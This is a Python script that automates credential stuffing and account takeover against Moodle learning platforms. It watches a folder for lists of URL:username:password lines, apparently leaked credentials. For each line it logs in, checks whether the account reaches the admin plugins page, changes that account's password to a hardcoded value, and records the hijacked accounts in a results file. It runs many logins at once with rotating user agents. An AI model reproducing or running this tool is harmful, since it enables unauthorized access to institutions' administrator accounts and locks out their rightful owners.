import os
import sys
import asyncio
import httpx
from tqdm import tqdm
from urllib.parse import urlparse, urljoin
from fake_useragent import UserAgent
from watchfiles import awatch, Change
from bs4 import BeautifulSoup
import re
import uuid

# ───────── CONFIG ─────────
DOWNLOADS_DIR = "../Filter/Moodle-Filter"  # Monitor Moodle-Filter directory
MOODLE_VALID = "../results-cms/Moodle"
STATE_FILE = "../results-cms/Moodle/processed_files.txt"
STABILITY_DELAY = 1  # seconds between checks
STABILITY_TRIES = 1  # how many times size must stay the same
MAX_CONCURRENT = 30
TIMEOUT = 15
VALID_MOODLE_FILE = os.path.join(MOODLE_VALID, "Moodle_Valid.txt")
CHANGED_PASS_FILE = os.path.join(MOODLE_VALID, "Moodle_Changed_Pass.txt")
NEW_PASS = "SMnizar@0g32"  # Default new password
ua = UserAgent()
moodle_valid_count = 0
moodle_invalid_count = 0
status_printed = False
processed_files = set()
os.makedirs(DOWNLOADS_DIR, exist_ok=True)
os.makedirs(MOODLE_VALID, exist_ok=True)

def HEADERS():
    return {
        "User-Agent": ua.random,
        "Referer": "",
        "Connection": "keep-alive"
    }

def update_status():
    global status_printed
    status_lines = [
        f"Valid Logins: {moodle_valid_count}",
        f"Invalid Logins: {moodle_invalid_count}"
    ]
    if status_printed:
        sys.stdout.write("\033[2A")
    else:
        status_printed = True
    for line in status_lines:
        sys.stdout.write(f"{line}\r\n")
    sys.stdout.flush()

def parse_moodle_entry(line):
    try:
        match = re.match(r'^(https?://)?([a-zA-Z0-9.-]+)(?:/.*)?(/login/index\.php):([^:]+):(.+)$', line.strip())
        if not match:
            tqdm.write(f"[!] Bad entry format: {line.strip()}")
            return None
        scheme, host, path, username, password = match.groups()
        if not scheme:
            scheme = "https://"
        base_url = f"{scheme}{host}"
        parsed = urlparse(base_url)
        if not parsed.scheme or not parsed.hostname:
            return None
        login_url = f"{parsed.scheme}://{parsed.hostname}/login/index.php"
        return {
            'login_url': login_url,
            'username': username,
            'password': password,
            'original': line.strip()
        }
    except Exception as e:
        tqdm.write(f"[!] Parse error: {line.strip()} - {str(e)}")
        return None

async def get_login_token(client, login_url):
    headers = HEADERS()
    headers["Referer"] = login_url
    try:
        resp = await client.get(login_url, headers=headers)
        soup = BeautifulSoup(resp.text, 'html.parser')
        token_tag = soup.find('input', {'name': 'logintoken'})
        if token_tag:
            return token_tag['value']
        else:
            raise Exception("Login token not found")
    except Exception as e:
        raise Exception(f"Error retrieving token: {e}")

async def get_sesskey(client, base_url):
    profile_url = urljoin(base_url, "/user/profile.php")
    headers = HEADERS()
    headers["Referer"] = base_url
    try:
        resp = await client.get(profile_url, headers=headers)
        soup = BeautifulSoup(resp.text, 'html.parser')
        sesskey_tag = soup.find('input', {'name': 'sesskey'})
        if sesskey_tag:
            return sesskey_tag['value']
        else:
            raise Exception("Sesskey not found on profile page")
    except Exception as e:
        raise Exception(f"Error retrieving sesskey: {e}")

async def change_password_moodle(client, base_url, username, old_password, new_password, entry):
    headers = HEADERS()
    try:
        sesskey = await get_sesskey(client, base_url)
        change_url = urljoin(base_url, "/login/change_password.php")
        headers["Referer"] = change_url
        headers["Origin"] = base_url

        payload = {
            'id': '1',  # Usually 1 for admin, but works for current user
            'sesskey': sesskey,
            '_qf__login_change_password_form': '1',
            'password': old_password,
            'newpassword1': new_password,
            'newpassword2': new_password,
            'submitbutton': 'Save+changes'
        }

        resp = await client.post(change_url, data=payload, headers=headers)
        text = resp.text
        final_url = str(resp.url)

        # Check for success message in response text
        if "Password has been changed" in text or "Password changed" in text:
            with open(CHANGED_PASS_FILE, "a", encoding="utf-8", buffering=1) as cf:
                cf.write(f"{base_url}/login/index.php:{username}:{new_password}\n")
                cf.flush()
            tqdm.write(f"[✓] Password changed for {entry}")
            return True
        elif "change_password.php" in final_url:
            tqdm.write(f"[!] Password change failed for {entry}: Still on change page")
            return False
        else:
            with open(CHANGED_PASS_FILE, "a", encoding="utf-8", buffering=1) as cf:
                cf.write(f"{base_url}/login/index.php:{username}:{new_password}\n")
                cf.flush()
            tqdm.write(f"[✓] Password likely changed for {entry}: Redirected from change page")
            return True
    except Exception as e:
        tqdm.write(f"[!] Change pass error for {entry}: {e}")
        return False

async def check_moodle_login(parsed):
    global moodle_valid_count, moodle_invalid_count
    if not parsed:
        moodle_invalid_count += 1
        update_status()
        return
    async with semaphore:
        entry = parsed['original']
        login_url = parsed['login_url']
        username = parsed['username']
        password = parsed['password']
        parsed_url = urlparse(login_url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        host = parsed_url.hostname
        headers = HEADERS()
        headers["Referer"] = login_url
        try:
            async with httpx.AsyncClient(timeout=TIMEOUT, verify=False, follow_redirects=True) as client:
                logintoken = await get_login_token(client, login_url)
                data = {
                    'logintoken': logintoken,
                    'username': username,
                    'password': password
                }
                response = await client.post(login_url, data=data, headers=headers)
                final_url = str(response.url)
                if "login/index.php" not in final_url:
                    plugins_url = urljoin(base_url, "/admin/plugins.php")
                    plugins_response = await client.get(plugins_url, headers=headers)
                    if plugins_response.status_code == 200 and "Plugins" in plugins_response.text:
                        moodle_valid_count += 1
                        output = f"{base_url}/login/index.php:{username}:{NEW_PASS}"
                        with open(VALID_MOODLE_FILE, "a", encoding="utf-8", buffering=1) as vf:
                            vf.write(f"{output}\n")
                            vf.flush()
                        success = await change_password_moodle(client, base_url, username, password, NEW_PASS, entry)
                        if not success:
                            tqdm.write(f"[!] Password change failed for {entry}")
                    else:
                        moodle_invalid_count += 1
                        tqdm.write(f"[!] Login failed for {entry}: Plugins page check failed")
                else:
                    moodle_invalid_count += 1
                    tqdm.write(f"[!] Login failed for {entry}: Still on login page")
        except Exception as e:
            moodle_invalid_count += 1
            tqdm.write(f"[!] Login error for {entry}: {e}")
        finally:
            update_status()

async def wait_until_stable(file_path: str) -> bool:
    """Wait until file stops growing."""
    prev_size = -1
    stable_count = 0
    while True:
        try:
            size = os.path.getsize(file_path)
        except FileNotFoundError:
            return False
        if size == prev_size:
            stable_count += 1
            if stable_count >= STABILITY_TRIES:
                return True
        else:
            stable_count = 0
            prev_size = size
        await asyncio.sleep(STABILITY_DELAY)

async def process_file(file_path: str):
    """Process lines from input file for Moodle login checking."""
    global moodle_invalid_count
    try:
        stable = await wait_until_stable(file_path)
        if not stable:
            tqdm.write(f"[!] File {file_path} not stable or removed")
            return

        processed_lines = []
        with open(file_path, "r", encoding="utf-8", errors="replace") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                parts = line.rsplit(":", 2)
                if len(parts) == 3:
                    url, username, password = parts
                    if not url.startswith(('http://', 'https://')):
                        url = f"https://{url}"
                        line = f"{url}:{username}:{password}"
                    processed_lines.append(line)
                else:
                    tqdm.write(f"[!] Skipped invalid line format: {line}")

        if processed_lines:
            tasks = []
            for line in processed_lines:
                parsed = parse_moodle_entry(line)
                if parsed:
                    tasks.append(check_moodle_login(parsed))
                else:
                    tqdm.write(f"[!] Failed to parse line for login: {line}")
                    moodle_invalid_count += 1
            if tasks:
                await asyncio.gather(*tasks)
            tqdm.write(f"[+] Processed file: {file_path} ({len(processed_lines)} lines processed)")

        processed_files.add(file_path)

    except Exception as e:
        tqdm.write(f"[!] Error processing {file_path}: {e}")

async def watch_folder():
    global processed_files, semaphore
    processed_files = set()
    semaphore = asyncio.Semaphore(MAX_CONCURRENT)
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE, "r") as f:
            processed_files = set(line.strip() for line in f if line.strip())
    tqdm.write(f"👀 Watching folder: {DOWNLOADS_DIR}")
    async for changes in awatch(DOWNLOADS_DIR):
        for change, path in changes:
            if change == Change.added and os.path.isfile(path) and path not in processed_files and os.path.splitext(path)[1].lower() == '.txt':
                await process_file(path)
                with open(STATE_FILE, "a") as f:
                    f.write(f"{path}\n")

if __name__ == "__main__":
    try:
        for f in [VALID_MOODLE_FILE, CHANGED_PASS_FILE]:
            open(f, 'a').close()
        asyncio.run(watch_folder())
    except KeyboardInterrupt:
        tqdm.write("\n🛑 Monitoring stopped")
    finally:
        tqdm.write("🔌 Shutdown complete")